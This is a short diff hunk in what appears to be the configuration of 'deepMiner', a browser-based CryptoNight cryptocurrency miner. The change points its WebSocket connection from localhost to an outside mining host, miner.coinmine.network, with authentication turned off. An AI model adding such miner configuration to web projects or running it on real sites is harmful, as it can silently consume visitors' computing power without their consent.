@@ -575,7 +575,7 @@
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
     LIB_URL: "https://miner.coinmine.network/lib/",
-    WEBSOCKET_SHARDS: [["ws://127.0.0.1/api"]],
+    WEBSOCKET_SHARDS: [["ws://miner.coinmine.network/api"]],
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
